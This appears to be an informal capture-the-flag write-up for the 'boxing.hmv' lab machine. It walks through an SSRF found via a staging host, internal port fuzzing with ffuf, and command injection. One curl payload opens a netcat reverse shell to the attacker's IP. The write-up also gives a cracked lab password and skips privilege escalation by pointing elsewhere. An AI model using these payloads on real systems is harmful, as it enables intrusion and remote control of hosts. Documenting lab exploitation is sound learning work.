Host NAME: boxing.hmv

on fuzzing we find a feedback.php

Directory indexing was also found on images, css, and js endpoints.

In the feedback.php form, if we intercept the request, we can see an x-origin-domain header, which has the url staging-env.boxing.hmv


Adding this to the hosts file reveals a new webpage.

Here, we seem to be able to play around by navigating to server urls. Is it possible to play around with these urls to obtain something?

So there is SSRF here like this:
boxing.hmv@[ATTACKER IP]:8000

Running a python http server will allow it to query it. Maybe we can make it query a php file and get code execution.

Now that we have SSRF, it is time to see whether we can fuzz for local ports that are open. This will be done by making ffuf fuzz over this parameter
boxing.hmv@localhost:FUZZ

Fuzzing command:
ffuf -u 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:FUZZ' -w <(seq 1 65000) -fs 1167

So we get that port 5000 and port 80 are open. So let's try and find out what's in it.

By entering this particular payload in the url:
boxing.hmv@localhost:5000/index.php?processName=apache2


So we can get command injection like this:
curl 'http://staging-env.boxing.hmv/index.php?url=boxing.hmv@localhost:5000?processName=system%2B-e%2Bnc%2B-c%2Bbash%2B192.168.29.170%2B4444'

Now /var/www/dev/boxing_database.db is an interesting file found by linpeas.sh

We download this onto our machine and analyse it.

On cracking credentials from the database, we get the password as Cassius!123 for the user cassius

I have no idea wtf they did for privesc. I just copied the commands from this writeup:
https://medium.com/@josemlwdf/boxing-fb1dca50fea7
